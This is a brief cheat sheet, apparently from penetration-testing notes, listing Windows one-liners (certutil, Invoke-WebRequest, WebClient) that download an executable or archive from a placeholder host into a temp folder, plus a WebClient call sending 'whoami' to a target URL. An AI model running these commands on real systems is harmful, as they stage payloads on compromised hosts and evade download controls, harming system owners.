# File Download

```
certutil.exe -urlcache -split -f "http://192.168.1.1/file.exe"

powershell -c Invoke-WebRequest -Uri "http://192.168.1.1/file.exe" -OutFile "file.exe"

powershell -c (New-Object System.Net.WebClient).DownloadFile("https://192.168.1.1/file.zip", "C:\Windows\Temp\file.zip") 
```

### Command is like curl

```
PS C:\> $wc = New-Object Net.WebClient
PS C:\> $wc.DownloadString("http://target/?whoami")
```
